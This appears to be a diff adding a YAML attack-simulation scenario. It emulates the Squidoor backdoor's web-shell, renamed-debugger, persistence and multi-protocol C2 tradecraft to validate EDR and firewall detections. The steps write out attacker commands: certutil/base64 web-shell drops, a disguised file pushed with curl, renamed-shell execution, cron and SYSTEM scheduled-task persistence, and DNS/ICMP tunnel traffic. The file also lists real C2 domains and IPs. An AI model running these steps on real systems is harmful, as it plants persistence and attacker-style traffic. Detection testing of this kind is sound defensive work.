@@ -1,0 +1,577 @@
+# CL-STA-0049 (Unit 42, 2025-02-27): web shells (OutlookDC.aspx / Error.aspx / TimeoutAPI.aspx)
+# are certutil-decoded onto an exposed web server, one is disguised as a certificate and pushed
+# to a peer with curl; a renamed debugger (cdb.exe -> C:\ProgramData\fontdrvhost.exe) loads
+# Squidoor from config.ini, a scheduled task (Microsoft\Windows\AppID\EPolicyManager) persists it,
+# and the backdoor talks over Outlook-drafts (p_/r_ subjects), DNS and ICMP. DC points at:
+# EDR leg (steps 01-06) the webroot .aspx writes, the renamed-binary loader, the persistence
+# entry, the report-domain DNS lookups and the padded ICMP; NDR leg (07-08) the NGFW EAL beacon to
+# the published domains/IPs and the WildFire threat log for config.ini's SHA-256. Both legs carry
+# the run host (src_host) and CR-MP-0023 fuses them. DNS lookups of the 5 report domains go only
+# through @${LAB_RESOLVER:-127.0.0.53} (no session opened). The Outlook/Graph leg is NOT emitted as
+# M365 audit: the report suggests an actor-held mailbox and no M365 emitter can carry src_host.
+# The report lists domains and IPs unpaired; the NGFW records pair them only to satisfy the emitter.
+scenario_id: SIM-MP-023
+name: "Squidoor (CL-STA-0049) Web Shell to Renamed-Debugger Backdoor with Multi-Protocol C2 — EDR + NGFW Stitch"
+version: "1.0"
+status: active
+
+plane: ANALYTICS
+detection_types:
+  - BIOC
+  - XQL
+  - IOC
+  - ABIOC
+  - Correlation
+
+uc_ref: UCS-IR-02
+tc_ref: TC-IR-05
+tc_refs:
+  - TC-IR-05
+  - TC-NDR-01
+  - TC-TH-06
+pov_scenario_id: POV-SC-001
+uc_name: "Incident Response"
+tc_name: "Demonstrate correlation-based detections across endpoint + network + identity telemetry"
+
+mitre_tactic: "TA0003"
+mitre_tactic_name: "Persistence"
+mitre_technique: "T1505.003"
+mitre_technique_name: "Server Software Component: Web Shell"
+additional_techniques:
+  - technique: "T1140"
+    name: "Deobfuscate/Decode Files or Information"
+  - technique: "T1036.008"
+    name: "Masquerading: Masquerade File Type"
+  - technique: "T1570"
+    name: "Lateral Tool Transfer"
+  - technique: "T1127"
+    name: "Trusted Developer Utilities Proxy Execution"
+  - technique: "T1036.005"
+    name: "Masquerading: Match Legitimate Name or Location"
+  - technique: "T1082"
+    name: "System Information Discovery"
+  - technique: "T1053.005"
+    name: "Scheduled Task/Job: Scheduled Task"
+  - technique: "T1053.003"
+    name: "Scheduled Task/Job: Cron"
+  - technique: "T1102"
+    name: "Web Service"
+  - technique: "T1071.004"
+    name: "Application Layer Protocol: DNS"
+  - technique: "T1095"
+    name: "Non-Application Layer Protocol"
+  - technique: "T1071.001"
+    name: "Application Layer Protocol: Web Protocols"
+
+threat_report: "Unit 42 — Squidoor: Suspected Chinese Threat Actor's Backdoor Targets Global Organizations (CL-STA-0049)"
+threat_report_url: "https://unit42.paloaltonetworks.com/advanced-backdoor-squidoor/"
+
+# ── Causality contract ──────────────────────────────────────────────────────
+# The exposed web-server worker owns the chain (IIS w3wp.exe in the report; the Linux
+# primary path models it as the www-data web worker). Steps 02-06 descend from the web
+# shell by process lineage; the NGFW legs pivot onto the same run host (src_host).
+cgo_anchor:
+  image_name: "apache2"
+  primary_username: "www-data"
+
+execution_identity:
+  default: www-data
+  options:
+    - www-data
+    - container-runtime
+    - root
+
+push_supported: true
+pull_supported: true
+
+infra_modules_needed:
+  - base
+  - edr
+  - ndr
+
+# ── v2.0 KPI / Methodology Metadata ─────────────────────────────────────────
+validation_methodology: "Multi-Plane Correlation & Behavioral Detection Accuracy"
+methodology_family: "F1"
+primary_kpi: "MTTD"
+threshold:
+  kpi: "MTTD"
+  op: "≤"
+  value: 600
+  unit: "seconds"
+success_criteria: |
+  On the run host, Cortex XDR raises the endpoint signals the report's tradecraft produces:
+  .aspx web shells decoded into a webroot by the web-service account, a web shell copied out
+  as a certificate and pushed to a peer, a renamed system binary executing a config.ini
+  script from a ProgramData-style path, a persistence entry named EPolicyManager, DNS
+  lookups of the five published CL-STA-0049 domains (Unit 42 enrichment names the actor),
+  and padded ICMP plus long-label DNS from a service account. The NGFW EAL beacon to the
+  published domains/IPs and the WildFire malicious verdict for config.ini's published
+  SHA-256 land in panw_ngfw_traffic_raw / panw_ngfw_threat_raw carrying the same src_host,
+  src_ip and src_user. CR-MP-0023 fuses the endpoint and network alerts on src_host into one
+  incident within the correlation window, and mean time from the web-shell write to the first
+  alert is within the MTTD budget.
+moat_tier: "LEAD"
+
+correlation_window_seconds: 1800
+required_planes_in_incident:
+  - EDR
+  - NDR
+stitching_key: src_host
+
+indicators:
+  - id: ind-01
+    type: domain
+    value: "support.vmphere.com"
+    source_url: "https://unit42.paloaltonetworks.com/advanced-backdoor-squidoor/"
+    safe_form: dns_lookup
+    surfaces_in: [step-05, step-07]
+    description: "Squidoor C2 domain (report IoC list, published as Support.vmphere[.]com; DNS is case-insensitive). Looked up via the lab resolver in step-05; dst_domain of NGFW EAL sub-step 1 in step-07."
+  - id: ind-02
+    type: domain
+    value: "update.hobiter.com"
+    source_url: "https://unit42.paloaltonetworks.com/advanced-backdoor-squidoor/"
+    safe_form: dns_lookup
+    surfaces_in: [step-05, step-07]
+    description: "Squidoor C2 domain (report IoC list, published as Update.hobiter[.]com). Looked up in step-05; dst_domain of NGFW EAL sub-step 2 in step-07."
+  - id: ind-03
+    type: domain
+    value: "microsoft-beta.com"
+    source_url: "https://unit42.paloaltonetworks.com/advanced-backdoor-squidoor/"
+    safe_form: dns_lookup
+    surfaces_in: [step-05, step-07]
+    description: "Squidoor C2 domain (report IoC list). Looked up in step-05; dst_domain of NGFW EAL sub-step 3 in step-07."
+  - id: ind-04
+    type: domain
+    value: "zimbra-beta.info"
+    source_url: "https://unit42.paloaltonetworks.com/advanced-backdoor-squidoor/"
+    safe_form: dns_lookup
+    surfaces_in: [step-05]
+    description: "Squidoor C2 domain (report IoC list). Looked up via the lab resolver in step-05."
+  - id: ind-05
+    type: domain
+    value: "microsoftapimap.com"
+    source_url: "https://unit42.paloaltonetworks.com/advanced-backdoor-squidoor/"
+    safe_form: dns_lookup
+    surfaces_in: [step-05]
+    description: "Squidoor C2 domain (report IoC list). Looked up via the lab resolver in step-05."
+  - id: ind-06
+    type: ipv4
+    value: "209.141.40.254"
+    source_url: "https://unit42.paloaltonetworks.com/advanced-backdoor-squidoor/"
+    safe_form: log_field
+    surfaces_in: [step-07]
+    description: "CL-STA-0049 IP (report IoC list). dst of NGFW EAL sub-step 1; the report does not pair it with a domain, so the domain pairing in that record is synthetic."
+  - id: ind-07
+    type: ipv4
+    value: "104.244.72.123"
+    source_url: "https://unit42.paloaltonetworks.com/advanced-backdoor-squidoor/"
+    safe_form: log_field
+    surfaces_in: [step-07]
+    description: "CL-STA-0049 IP (report IoC list). dst of NGFW EAL sub-step 2 (domain pairing synthetic)."
+  - id: ind-08
+    type: ipv4
+    value: "47.76.224.93"
+    source_url: "https://unit42.paloaltonetworks.com/advanced-backdoor-squidoor/"
+    safe_form: log_field
+    surfaces_in: [step-07]
+    description: "CL-STA-0049 IP (report IoC list). dst of NGFW EAL sub-step 3 (domain pairing synthetic)."
+  - id: ind-09
+    type: sha256
+    value: "f663149d618be90e5596b28103d38e963c44a69a5de4a1be62547259ca9ffd2d"
+    source_url: "https://unit42.paloaltonetworks.com/advanced-backdoor-squidoor/"
+    safe_form: log_field
+    surfaces_in: [step-08]
+    description: "SHA-256 for Squidoor Windows version (config.ini), per the report. Carried only as filedigest on the synthetic WildFire threat log; no file is fetched."
+
+external_tools:
+  - name: cortexsim-eal-cli
+    source: "https://github.com/hankthebldr/cortex-pov-engine"
+    type: script
+    install_inline: false
+
+steps:
+  - id: step-01
+    name: "Decode .aspx web shells into the webroot and run recon from the web-service account"
+    command: |
+      STAGE=/tmp/cortexsim-mp023
+      WEBROOT="${WEBROOT:-$STAGE/www}"
+      mkdir -p "$WEBROOT" "$STAGE/drop"
+      printf "%s" "PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiAlPjwlLS0gQ29ydGV4U2ltIFNJTS1NUC0wMjMgaW5lcnQgd2ViLXNoZWxsIHN0YW5kLWluOiBubyBjb2RlLCBubyBoYW5kbGVyIC0tJT4=" > "$STAGE/drop/TimeoutAPI.b64"
+      base64 -d "$STAGE/drop/TimeoutAPI.b64" > "$WEBROOT/TimeoutAPI.aspx"
+      cp "$WEBROOT/TimeoutAPI.aspx" "$WEBROOT/OutlookDC.aspx"
+      cp "$WEBROOT/TimeoutAPI.aspx" "$WEBROOT/Error.aspx"
+      sh -c "id; hostname; uname -a; ls -la $WEBROOT" > "$STAGE/drop/webshell-exec.out" 2>&1
+      echo cortexsim-mp023-step01-webshells-decoded-and-executed
+    identity: www-data
+    mitre_technique: "T1505.003"
+    # Root of the causality spine — links from the CGO (web-server worker).
+    platforms: ["linux", "windows"]
+    platform_variants:
+      windows: |
+        $s = 'C:\ProgramData\cortexsim-mp023'
+        $w = "$s\wwwroot"
+        New-Item -ItemType Directory -Force -Path $w | Out-Null
+        Set-Content -Path "$s\TimeoutAPI.b64" -Value 'PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiAlPjwlLS0gQ29ydGV4U2ltIFNJTS1NUC0wMjMgaW5lcnQgd2ViLXNoZWxsIHN0YW5kLWluOiBubyBjb2RlLCBubyBoYW5kbGVyIC0tJT4='
+        certutil -f -decode "$s\TimeoutAPI.b64" "$w\TimeoutAPI.aspx"
+        Copy-Item "$w\TimeoutAPI.aspx" "$w\OutlookDC.aspx" -Force
+        Copy-Item "$w\TimeoutAPI.aspx" "$w\Error.aspx" -Force
+        cmd.exe /c "whoami & hostname & ver"
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "A web-service account (www-data / IIS app-pool identity) decodes base64 content into .aspx files named like the CL-STA-0049 web shells (OutlookDC.aspx, Error.aspx, TimeoutAPI.aspx) in a webroot — certutil -decode on Windows, base64 -d on Linux."
+        ttp_ref: "TTP-2026-0182"
+        detection_id: "bioc-mp-023-web-service-account-decodes-aspx-web-shell-into-webroot"
+      - plane: EDR
+        type: XQL
+        description: "Validation query: the web-service account wrote the three .aspx files and then spawned a shell running id / hostname / uname (or whoami / hostname / ver) inside the run window."
+        ttp_ref: "TTP-2026-0182"
+        detection_id: "xql-mp-023-web-shell-write-followed-by-recon-shell-from-web-service-account"
+
+  - id: step-02
+    name: "Disguise a web shell as a certificate and push it to a peer server with curl"
+    command: |
+      STAGE=/tmp/cortexsim-mp023
+      WEBROOT="${WEBROOT:-$STAGE/www}"
+      cp "$WEBROOT/Error.aspx" "$STAGE/drop/server.crt"
+      head -c 64 "$STAGE/drop/server.crt" > "$STAGE/drop/crt-head.out"
+      curl -s --max-time 5 -T "$STAGE/drop/server.crt" "http://${STAGE_HOST:-127.0.0.1}:${STAGE_PORT:-8080}/upload/server.crt" -o /dev/null || true
+      echo cortexsim-mp023-step02-webshell-disguised-as-cert-and-pushed
+    identity: www-data
+    mitre_technique: "T1036.008"
+    causality:
+      parent_step: step-01
+      pivot: process_lineage
+    platforms: ["linux"]
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "A web-service account copies an .aspx script to a .crt filename (script content behind a certificate extension) and uploads it with curl -T to an internal peer — the report's web-shell-as-certificate spread."
+        ttp_ref: "TTP-2026-0182"
+        detection_id: "bioc-mp-023-aspx-web-shell-copied-to-certificate-extension-and-uploaded"
+
+  - id: step-03
+    name: "Renamed system binary (fontdrvhost) executes a config.ini payload script — host recon"
+    command: |
+      STAGE=/tmp/cortexsim-mp023
+      mkdir -p "$STAGE/ProgramData"
+      cp /bin/sh "$STAGE/ProgramData/fontdrvhost"
+      chmod 755 "$STAGE/ProgramData/fontdrvhost"
+      printf "id\nhostname\nuname -a\nip -4 addr show\nps -eo pid,user,comm --no-headers\n" > "$STAGE/ProgramData/config.ini"
+      "$STAGE/ProgramData/fontdrvhost" "$STAGE/ProgramData/config.ini" > "$STAGE/drop/squidoor-recon.out" 2>&1
+      echo cortexsim-mp023-step03-renamed-loader-ran-config-ini
+    identity: www-data
+    mitre_technique: "T1127"
+    causality:
+      parent_step: step-01
+      pivot: process_lineage
+    platforms: ["linux", "windows"]
+    platform_variants:
+      windows: |
+        $p = 'C:\ProgramData'
+        $cdb = @("${env:ProgramFiles(x86)}\Windows Kits\10\Debuggers\x64\cdb.exe", "$env:ProgramFiles\Windows Kits\10\Debuggers\x64\cdb.exe") | Where-Object { Test-Path $_ } | Select-Object -First 1
+        Set-Content -Path "$p\config.ini" -Value '.echo cortexsim-mp023-config-ini; q'
+        if ($cdb) { Copy-Item $cdb "$p\fontdrvhost.exe" -Force; & "$p\fontdrvhost.exe" -cf "$p\config.ini" "$env:SystemRoot\System32\whoami.exe" }
+        else { Copy-Item "$env:SystemRoot\System32\whoami.exe" "$p\fontdrvhost.exe" -Force; & "$p\fontdrvhost.exe" /all }
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "A process whose image name is fontdrvhost runs from a ProgramData-style path rather than System32, its binary hash/original name being a different system binary (cdb.exe on Windows, sh on the Linux path), with config.ini as its argument — the report's renamed-cdb Squidoor loader."
+        ttp_ref: "TTP-2026-0182"
+        detection_id: "bioc-mp-023-renamed-system-binary-fontdrvhost-executes-config-ini-from-programdata"
+      - plane: EDR
+        type: XQL
+        description: "Validation query: the renamed fontdrvhost process spawned host-reconnaissance children (id/hostname/uname/ip/ps, or whoami) — Squidoor's fingerprinting of user, host, IP and OS."
+        ttp_ref: "TTP-2026-0182"
+        detection_id: "xql-mp-023-renamed-fontdrvhost-spawns-host-reconnaissance"
+
+  - id: step-04
+    name: "Persist the loader as EPolicyManager (cron @reboot; Windows scheduled task)"
+    command: |
+      STAGE=/tmp/cortexsim-mp023
+      crontab -l > "$STAGE/drop/crontab.before" 2>/dev/null
+      ( cat "$STAGE/drop/crontab.before"; echo "@reboot $STAGE/ProgramData/fontdrvhost $STAGE/ProgramData/config.ini # EPolicyManager cortexsim-mp023" ) | crontab -
+      crontab -l > "$STAGE/drop/crontab.after"
+      echo cortexsim-mp023-step04-epolicymanager-persistence-installed
+    identity: www-data
+    mitre_technique: "T1053.003"
+    causality:
+      parent_step: step-03
+      pivot: process_lineage
+    platforms: ["linux", "windows"]
+    platform_variants:
+      windows: |
+        schtasks.exe /create /f /tn "Microsoft\Windows\AppID\EPolicyManager" /sc onstart /ru SYSTEM /tr "C:\ProgramData\fontdrvhost.exe -cf C:\ProgramData\config.ini C:\Windows\System32\whoami.exe"
+        schtasks.exe /query /tn "Microsoft\Windows\AppID\EPolicyManager" /v /fo list
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "A persistence entry named EPolicyManager whose action launches the renamed fontdrvhost binary from a ProgramData-style path — a scheduled task under Microsoft\\Windows\\AppID on Windows (the report's task), a service-account crontab @reboot entry on Linux."
+        ttp_ref: "TTP-2026-0182"
+        detection_id: "bioc-mp-023-epolicymanager-persistence-launching-renamed-fontdrvhost"
+
+  - id: step-05
+    name: "Squidoor C2 channels: Outlook-drafts beacon shape, Pastebin check-in, report-domain DNS lookups"
+    command: |
+      STAGE=/tmp/cortexsim-mp023
+      mkdir -p "$STAGE/Explorer/UUID"
+      printf "%s\n" "graph_refresh_token=CORTEXSIM-INERT-NOT-A-TOKEN" > "$STAGE/Explorer/UUID/7d3c2a10-cortexsim-mp023"
+      cat > "$STAGE/drop/draft-beacon.json" <<JSON
+      {"subject":"p_4711","isDraft":true,"body":{"contentType":"Text","content":"Y29ydGV4c2ltLW1wMDIzLWluZXJ0LWJlYWNvbg=="}}
+      JSON
+      curl -s --max-time 5 "http://${STAGE_HOST:-127.0.0.1}:${STAGE_PORT:-8080}/raw/Local365" -o "$STAGE/drop/local365.txt" || true
+      curl -s --max-time 5 -X POST -H "Content-Type: application/json" --data @"$STAGE/drop/draft-beacon.json" "http://${STAGE_HOST:-127.0.0.1}:${STAGE_PORT:-8080}/v1.0/me/mailFolders/drafts/messages" -o /dev/null || true
+      curl -s --max-time 5 "http://${STAGE_HOST:-127.0.0.1}:${STAGE_PORT:-8080}/v1.0/me/mailFolders/drafts/messages?\$filter=startswith(subject,%27r_4711%27)" -o /dev/null || true
+      dig +short support.vmphere.com @${LAB_RESOLVER:-127.0.0.53}
+      dig +short update.hobiter.com @${LAB_RESOLVER:-127.0.0.53}
+      dig +short microsoft-beta.com @${LAB_RESOLVER:-127.0.0.53}
+      dig +short zimbra-beta.info @${LAB_RESOLVER:-127.0.0.53}
+      dig +short microsoftapimap.com @${LAB_RESOLVER:-127.0.0.53}
+      echo cortexsim-mp023-step05-c2-channel-shapes-and-report-domain-lookups
+    identity: www-data
+    mitre_technique: "T1102"
+    causality:
+      parent_step: step-03
+      pivot: process_lineage
+    platforms: ["linux", "windows"]
+    platform_variants:
+      windows: |
+        $k = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UUID\7d3c2a10-cortexsim-mp023'
+        New-Item -Path $k -Force | Out-Null
+        Set-ItemProperty -Path $k -Name 'token' -Value 'CORTEXSIM-INERT-NOT-A-TOKEN'
+        $h = if ($env:STAGE_HOST) { $env:STAGE_HOST } else { '127.0.0.1' }
+        $port = if ($env:STAGE_PORT) { $env:STAGE_PORT } else { '8080' }
+        $body = '{"subject":"p_4711","isDraft":true,"body":{"contentType":"Text","content":"Y29ydGV4c2ltLW1wMDIzLWluZXJ0LWJlYWNvbg=="}}'
+        try { Invoke-WebRequest -UseBasicParsing -TimeoutSec 5 -Uri "http://${h}:${port}/raw/Local365" | Out-Null } catch {}
+        try { Invoke-WebRequest -UseBasicParsing -TimeoutSec 5 -Method Post -ContentType 'application/json' -Body $body -Uri "http://${h}:${port}/v1.0/me/mailFolders/drafts/messages" | Out-Null } catch {}
+    expected_detections:
+      - plane: EDR
+        type: IOC
+        description: "DNS query for support.vmphere.com — a published CL-STA-0049 Squidoor C2 domain; Unit 42 threat intel enriches the alert with the actor."
+        ttp_ref: "TTP-2026-0182"
+        detection_id: "ioc-domain-support-vmphere-com"
+      - plane: EDR
+        type: IOC
+        description: "DNS query for update.hobiter.com — a published CL-STA-0049 Squidoor C2 domain."
+        ttp_ref: "TTP-2026-0182"
+        detection_id: "ioc-domain-update-hobiter-com"
+      - plane: EDR
+        type: IOC
+        description: "DNS query for microsoft-beta.com — a published CL-STA-0049 Squidoor C2 domain."
+        ttp_ref: "TTP-2026-0182"
+        detection_id: "ioc-domain-microsoft-beta-com"
+      - plane: EDR
+        type: IOC
+        description: "DNS query for zimbra-beta.info — a published CL-STA-0049 Squidoor C2 domain."
+        ttp_ref: "TTP-2026-0182"
+        detection_id: "ioc-domain-zimbra-beta-info"
+      - plane: EDR
+        type: IOC
+        description: "DNS query for microsoftapimap.com — a published CL-STA-0049 Squidoor C2 domain."
+        ttp_ref: "TTP-2026-0182"
+        detection_id: "ioc-domain-microsoftapimap-com"
+      - plane: EDR
+        type: XQL
+        description: "Validation query: a web-service-account process (child of the renamed loader) issued Graph mailFolders/drafts requests with p_/r_ subject filters and resolved several published CL-STA-0049 domains in one burst."
+        ttp_ref: "TTP-2026-0182"
+        detection_id: "xql-mp-023-service-account-outlook-drafts-c2-shape-and-report-domain-burst"
+
+  - id: step-06
+    name: "ICMP tunnel shape (padded echo payload) and long-label DNS tunnel queries to a lab zone"
+    command: |
+      STAGE=/tmp/cortexsim-mp023
+      ping -c 4 -s 512 -p 6d703032332d69636d70 "${STAGE_HOST:-127.0.0.1}" > "$STAGE/drop/icmp.out" 2>&1
+      for i in 1 2 3 4 5 6; do dig +short "$(head -c 30 /dev/urandom | base32 | tr -d = | tr A-Z a-z).t.cortexsim-canary.invalid" @${LAB_RESOLVER:-127.0.0.53}; done
+      echo cortexsim-mp023-step06-icmp-and-dns-tunnel-shapes
+    identity: www-data
+    mitre_technique: "T1095"
+    causality:
+      parent_step: step-05
+      pivot: process_lineage
+    platforms: ["linux", "windows"]
+    platform_variants:
+      windows: |
+        $h = if ($env:STAGE_HOST) { $env:STAGE_HOST } else { '127.0.0.1' }
+        ping.exe -n 4 -l 512 $h
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "A non-interactive service account runs ping with an oversized payload (-s/-l 512) and a custom fill pattern (-p) — Squidoor's ICMP-tunnel transport shape (CIcmpTransChannel)."
+        ttp_ref: "TTP-2026-0182"
+        detection_id: "bioc-mp-023-service-account-ping-with-oversized-patterned-icmp-payload"
+      - plane: EDR
+        type: XQL
+        description: "Validation query: the same service account issued a burst of DNS queries with long base32-shaped leftmost labels under one zone — the CDnsTransChannel tunnelling shape."
+        ttp_ref: "TTP-2026-0182"
+        detection_id: "xql-mp-023-long-label-dns-query-burst-from-service-account"
+
+  - id: step-07
+    name: "NGFW EAL leg: recurring beacon from the run host to the published domains/IPs"
+    command: |
+      : "${COLLECTOR_URL:=https://collector.cortexsim-canary.invalid/ngfw/eal/events}"
+      : "${COLLECTOR_HOST:=collector.cortexsim-canary.invalid}"
+      SRC_IP=$(hostname -I | awk '{print $1}')
+      SRC_HOST=$(hostname -s)
+      SRC_USER=$(id -un www-data 2>/dev/null || id -un)
+      cat > /tmp/mp-023-ngfw-eal.yml <<YML
+      campaign_id: CMP-MP-023
+      name: "Squidoor C2 egress from the run host to published CL-STA-0049 infrastructure"
+      authorized_by: "domain-consultant@paloaltonetworks.com"
+      simulation_authorized: true
+      c2_authorized: true
+      target_allowlist:
+        - "$COLLECTOR_HOST"
+      dry_run: false
+      tags: [mp-023, squidoor, cl-sta-0049, ngfw-eal]
+      steps:
+        - step_id: step-01
+          plugin: ngfw_eal_emitter
+          params:
+            collector_url: "$COLLECTOR_URL"
+            event_pattern: abnormal_recurring_comms
+            burst_count: 8
+            iterations: 1
+            dst_domain: "support.vmphere.com"
+            dst_ip: "209.141.40.254"
+            src_ip: "$SRC_IP"
+            src_host: "$SRC_HOST"
+            src_user: "$SRC_USER"
+        - step_id: step-02
+          plugin: ngfw_eal_emitter
+          params:
+            collector_url: "$COLLECTOR_URL"
+            event_pattern: abnormal_recurring_comms
+            burst_count: 8
+            iterations: 1
+            dst_domain: "update.hobiter.com"
+            dst_ip: "104.244.72.123"
+            src_ip: "$SRC_IP"
+            src_host: "$SRC_HOST"
+            src_user: "$SRC_USER"
+        - step_id: step-03
+          plugin: ngfw_eal_emitter
+          params:
+            collector_url: "$COLLECTOR_URL"
+            event_pattern: abnormal_recurring_comms
+            burst_count: 8
+            iterations: 1
+            dst_domain: "microsoft-beta.com"
+            dst_ip: "47.76.224.93"
+            src_ip: "$SRC_IP"
+            src_host: "$SRC_HOST"
+            src_user: "$SRC_USER"
+      YML
+      python3 -m scripts.eal_simulator.cli run /tmp/mp-023-ngfw-eal.yml --live
+      echo cortexsim-mp023-step07-ngfw-eal-beacon-emitted
+    identity: container-runtime
+    mitre_technique: "T1071.001"
+    # Same run host (src_host / src_ip) as the endpoint leg — the NGFW record is
+    # stitched onto the backdoor's endpoint by entity, not by process fork.
+    causality:
+      parent_step: step-05
+      pivot: endpoint_network_stitch
+    platforms: ["linux"]
+    expected_detections:
+      - plane: NDR
+        type: ABIOC
+        description: "Abnormal recurring communications to a rare domain from the run host — the NGFW EAL ABIOC fires on the recurring ssl/443 burst to destinations the fleet never talks to, anchored to src_host / src_ip."
+        ttp_ref: "TTP-2026-0182"
+        detection_id: "abioc-mp-023-recurring-communications-from-run-host-to-rare-cl-sta-0049-domains"
+      - plane: NDR
+        type: IOC
+        description: "NGFW traffic to 209.141.40.254 — a published CL-STA-0049 IP."
+        ttp_ref: "TTP-2026-0182"
+        detection_id: "ioc-ipv4-209-141-40-254"
+      - plane: NDR
+        type: IOC
+        description: "NGFW traffic to 104.244.72.123 — a published CL-STA-0049 IP."
+        ttp_ref: "TTP-2026-0182"
+        detection_id: "ioc-ipv4-104-244-72-123"
+      - plane: NDR
+        type: IOC
+        description: "NGFW traffic to 47.76.224.93 — a published CL-STA-0049 IP."
+        ttp_ref: "TTP-2026-0182"
+        detection_id: "ioc-ipv4-47-76-224-93"
+
+  - id: step-08
+    name: "NGFW threat leg: WildFire malicious verdict for config.ini's published SHA-256 — correlation"
+    command: |
+      : "${COLLECTOR_URL:=https://collector.cortexsim-canary.invalid/ngfw/threat/events}"
+      : "${COLLECTOR_HOST:=collector.cortexsim-canary.invalid}"
+      SRC_IP=$(hostname -I | awk '{print $1}')
+      SRC_HOST=$(hostname -s)
+      SRC_USER=$(id -un www-data 2>/dev/null || id -un)
+      cat > /tmp/mp-023-ngfw-threat.yml <<YML
+      campaign_id: CMP-MP-023
+      name: "Squidoor config.ini WildFire verdict on the run host"
+      authorized_by: "domain-consultant@paloaltonetworks.com"
+      simulation_authorized: true
+      c2_authorized: true
+      target_allowlist:
+        - "$COLLECTOR_HOST"
+      dry_run: false
+      tags: [mp-023, squidoor, cl-sta-0049, ngfw-threat]
+      steps:
+        - step_id: step-01
+          plugin: ngfw_threat_emitter
+          params:
+            collector_url: "$COLLECTOR_URL"
+            event_pattern: wildfire_malicious_file
+            file_sha256: "f663149d618be90e5596b28103d38e963c44a69a5de4a1be62547259ca9ffd2d"
+            file_name: "config.ini"
+            file_type: "unknown"
+            verdict: malicious
+            action: alert
+            src_ip: "$SRC_IP"
+            src_host: "$SRC_HOST"
+            src_user: "$SRC_USER"
+            iterations: 1
+      YML
+      python3 -m scripts.eal_simulator.cli run /tmp/mp-023-ngfw-threat.yml --live
+      echo cortexsim-mp023-step08-ngfw-threat-log-emitted
+    identity: container-runtime
+    mitre_technique: "T1105"
+    causality:
+      parent_step: step-07
+      pivot: shared_entity
+    platforms: ["linux"]
+    expected_detections:
+      - plane: NDR
+        type: IOC
+        description: "WildFire threat log names filedigest f663149d…ffd2d (Squidoor Windows config.ini per the report) for the run host; the hash matches the published indicator and enriches as CL-STA-0049. Delivery host is not published, so the record keeps the emitter's preset destination."
+        ttp_ref: "TTP-2026-0182"
+        detection_id: "ioc-file-sha256-f663149d618be90e5596b28103d38e963c44a69a5de4a1be62547259ca9ffd2d"
+      - plane: NDR
+        type: XQL
+        description: "Validation query: the WildFire malicious verdict for config.ini landed in panw_ngfw_threat_raw with the run host's src / endpoint hostname within the run window."
+        ttp_ref: "TTP-2026-0182"
+        detection_id: "xql-mp-023-squidoor-config-ini-wildfire-verdict-landed-for-run-host"
+      - plane: ANALYTICS
+        type: Correlation
+        description: "CR-MP-0023 fuses the endpoint web-shell/loader/persistence/C2-shape alerts and the NGFW beacon + WildFire alerts on the shared src_host within 1800 s into one CL-STA-0049 incident."
+        ttp_ref: "TTP-2026-0182"
+        detection_id: "CR-MP-0023"
+
+cleanup:
+  commands:
+    - "crontab -u www-data -l 2>/dev/null | grep -v cortexsim-mp023 | crontab -u www-data - || true"
+    - "rm -rf /tmp/cortexsim-mp023 /tmp/mp-023-ngfw-eal.yml /tmp/mp-023-ngfw-threat.yml"
+    - "schtasks.exe /delete /f /tn \"Microsoft\\Windows\\AppID\\EPolicyManager\""
+    - "Remove-Item -Recurse -Force -ErrorAction SilentlyContinue C:\\ProgramData\\cortexsim-mp023, C:\\ProgramData\\fontdrvhost.exe, C:\\ProgramData\\config.ini, HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UUID\\7d3c2a10-cortexsim-mp023"
+    - "echo cortexsim-mp023-cleanup-complete"
+
+author: "Henry Reed"
+created: "2026-10-27"
+last_updated: "2026-10-27"
+tags:
+  - unit42
+  - stitched-chain
+  - actor:cl-sta-0049
+  - squidoor
+  - finaldraft
+  - web-shell
+  - lolbas
+  - multi-protocol-c2
+  - ngfw-eal
+  - ngfw-threat
+  - real-ioc-dns-lookup
